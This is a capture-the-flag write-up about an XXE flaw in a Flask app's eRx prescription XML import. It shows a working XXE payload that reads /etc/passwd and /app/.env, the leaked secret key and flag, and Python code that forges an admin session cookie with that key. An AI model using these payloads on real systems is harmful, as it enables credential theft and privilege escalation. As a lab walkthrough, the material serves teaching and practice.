---
title: "I'll Be Reading That"
date: 2026-08-16
description: An XXE in the eRx prescription import reads arbitrary files, leaking the .env with the Flask session signing key.
challenge_author: "Kay"
writeup_author: "wallsdeep13"
---

**Challenge:** https://ctf.urisc.club/challenges#I'll%20be%20reading%20that-23

**Goal:** "We're logged in as a manager, but the application never reveals its secret signing key, so our goal is to look beyond the application and find what the developers accidentally left exposed."

**Flag:**
- `SRCTF!{3xt3rnal_1nJ3cTi0n}` - in `/app/.env`
+ The actual flask signing key `AUSSIEMED_SECRET_KEY=9c688eb02f868b34581815a9e05f0333e7f0e5807b47b49e9a7ffe1c1e5a6a3c`

---

## Vulnerability

`POST /dashboard/issue-prescriptions/` accepts an eRx XML file (form field `erx`). The XML is parsed with **lxml** (libxml2), which by default resolves external entities. An entity in the `<patient>` tag is reflected in the success notice:

```
Prescription issued for <patient-text> - <medication-text> (from eRx)
```

So an external entity `SYSTEM "file:///path"` placed in `<patient>` (or `<medication>`) dumps the target file into the page.

## Finding the reflection tags

The notice shows `None - None` for most structures. The two tags the parser reads are:

- `<patient>` → shown as the "First Name" slot
- `<medication>` → shown as the "Last Name" slot

(Bisected by fuzzing tag names with an inline entity `LEAKMARKER123`.)

Note: the read only works for the *value* of the file if it doesn't break XML parsing - `/etc/passwd` worked fine; `/proc/self/environ` errored with `Invalid character: Char 0x0 out of allowed range` (null bytes).

## Attack Path

### 1. Confirm XXE / arbitrary file read

Upload:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <patient>&xxe;</patient>
  <medication>test</medication>
</root>
```

Response notice:

```
Prescription issued for root:x:0:0:root:/root:/bin/bash
... - test (from eRx)
```

### 2. Read `/app/.env`

Same payload with `file:///app/.env`:

```
Prescription issued for # SECRET_KEY signs the Flask session cookie. DO NOT LEAK!
SRCTF!{3xt3rnal_1nJ3cTi0n}
AUSSIEMED_SECRET_KEY=9c688eb02f868b34581815a9e05f0333e7f0e5807b47b49e9a7ffe1c1e5a6a3c
 - test (from eRx)
```

### 3. Session forging an Admin instance

With the leaked key, itsdangerous can sign a fake Flask session:

```python
from itsdangerous.url_safe import URLSafeTimedSerializer
s = URLSafeTimedSerializer("9c688eb02f868b34581815a9e05f0333e7f0e5807b47b49e9a7ffe1c1e5a6a3c", salt="cookie-session")
token = s.dumps({"role": "admin", "user_id": 1})
```

---

## Notes

- External network entity fetch is blocked (`Attempt to load network entity`), but `file://` reads are allowed
- I tried using my own E-Prescriptions from my actual doctor for this challenge. It helped more than the medicine itself.